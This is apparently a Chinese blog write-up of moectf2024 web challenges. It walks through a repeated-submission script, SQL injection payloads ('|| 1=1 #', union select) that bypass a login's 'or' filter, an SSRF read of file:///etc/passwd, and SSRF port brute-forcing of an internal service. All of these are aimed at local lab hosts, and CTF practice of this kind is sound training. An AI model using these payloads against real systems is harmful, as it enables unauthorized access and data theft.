---
typora-root-url: ./moectf2024-Web-wp
title: moectf2024-Web-wp
toc: true
categories:
  - 技术
  - ctf
  - web
  - wp
date: 2024-10-10 22:15:08
tags: 
  - ctf
---

## web入门指北

phpstudy傻瓜式安装即可，鼓励大家自行搭建，然后附件源码放网站根目录（phpstudy默认一般是WWW），注意删除根目录下的index.php, 覆盖index.html, 因为默认配置访问根目录（GET /）index.php的优先级比index.html高，浏览器输入正确url访问即可回显flag

## ez_http

按要求做，做下一步时不要丢弃上一步的操作

![](img1.png)

## ProveYourLove

前端阻止重复提交，发包绕过, exp：

```python
//exp.py
import requests

url = 'http://127.0.0.1:53785/questionnaire'

data = {
    'nickname': 'xiaotian',
    'target': '333',
    'message': 'eeeeeeeeee',
    'user_gender': 'male',
    'target_gender': 'male',
    'anonymous': 'false'
}

for i in range(300):
    response = requests.post(url, json=data)
    print('Status Code:', response.status_code)
    print('Response JSON:', response.json())
```

电院_Backend

后台常用robots协议防止爬虫爬取，访问robots.txt发现存在/admin/, 

```
User-agent: *
Disallow: /admin/
```

访问/admin/发现后台，附件给了login.php源码

```php
<?php
error_reporting(0);
session_start();

if($_POST){
    $verify_code = $_POST['verify_code'];

    // 验证验证码
    if (empty($verify_code) || $verify_code !== $_SESSION['captcha_code']) {
        echo json_encode(array('status' => 0,'info' => '验证码错误啦，再输入吧'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $email = $_POST['email'];
    if(!preg_match("/[a-zA-Z0-9]+@[a-zA-Z0-9]+\\.[a-zA-Z0-9]+/", $email)||preg_match("/or/i", $email)){
        echo json_encode(array('status' => 0,'info' => '不存在邮箱为： '.$email.' 的管理员账号！'));
        unset($_SESSION['captcha_code']);
        exit;
    }

    $pwd = $_POST['pwd'];
    $pwd = md5($pwd);
    $conn = mysqli_connect("localhost","root","123456","xdsec",3306);

    $sql = "SELECT * FROM admin WHERE email='$email' AND pwd='$pwd'";
    $result = mysqli_query($conn,$sql);
    $row = mysqli_fetch_array($result);

    if($row){
        $_SESSION['admin_id'] = $row['id'];
        $_SESSION['admin_email'] = $row['email'];
        echo json_encode(array('status' => 1,'info' => '登陆成功，moectf{testflag}'));
    } else{
        echo json_encode(array('status' => 0,'info' => '管理员邮箱或密码错误'));
        unset($_SESSION['captcha_code']);
    }
}
?>
```

存在sql注入，登录成功即返回flag, 但是or被ban了，还有正则，验证码正常填，在email这里注入，密码随便填

绕过方法很多，简单列举

```sql
123@a.b' || 1=1 #
123@a.b' union select 1,2,3 -- 
```

## ImageCloud前置

经典的ssrf`payload: file:///etc/passwd`

## ImageCloud

随便传个文件，点击已上传文件查看，发现url中有`/image?url=http://localhost:5000/static/{filename}`

题目给了源码文件，5000端口映射在外网，但是app2.py运行在一个随机端口（5001-6000）需要借助ssrf爆破内网app2的端口

![](img2.png)

可以通过暴露出来的服务打ssrf爆破app2的运行端口，从而借助ssrf窃取内网app2的图片

![](img3.png)